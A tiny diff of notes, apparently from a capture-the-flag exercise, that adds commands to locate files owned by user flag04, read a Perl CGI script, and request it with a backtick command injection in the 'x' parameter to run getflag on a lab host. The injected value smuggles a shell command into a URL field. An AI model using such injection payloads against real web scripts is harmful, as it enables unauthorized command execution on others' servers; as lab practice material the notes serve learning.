@@ -1,1 +1,4 @@
-192.168.56.3:4747/level04.pll?x=`exec getflag`
+find / -user flag04 2>/dev/null
+cat /var/www/level04/level04.pl
+
+192.168.56.3:4747/level04.pl?x=`exec getflag`
